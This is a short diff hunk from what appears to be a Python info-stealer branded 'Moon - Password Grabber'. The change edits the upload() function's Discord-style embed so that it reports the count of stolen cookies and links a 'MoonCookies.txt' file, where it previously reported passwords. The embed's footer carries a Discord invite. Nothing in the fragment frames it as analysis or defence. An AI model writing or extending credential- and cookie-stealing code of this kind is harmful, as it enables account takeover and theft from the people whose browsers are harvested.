@@ -529,7 +529,7 @@ def upload(name, link):
             "embeds": [{
                 "title": " Moon  -  Password Grabber",
                 "description":
-                f"**Found:\n{ra}\n\n**Data:**\n**{PasswCount}** Passwords Found\n[MoonPassword.txt]({link})",
+                f"**Found**:\n{ra}\n\n**Data:**\n**{PasswCount}** Cookies Found\n[MoonCookies.txt]({link})",
                 "color": 0,
                 "footer": {
                     "text": "dsc.gg/yvvi",
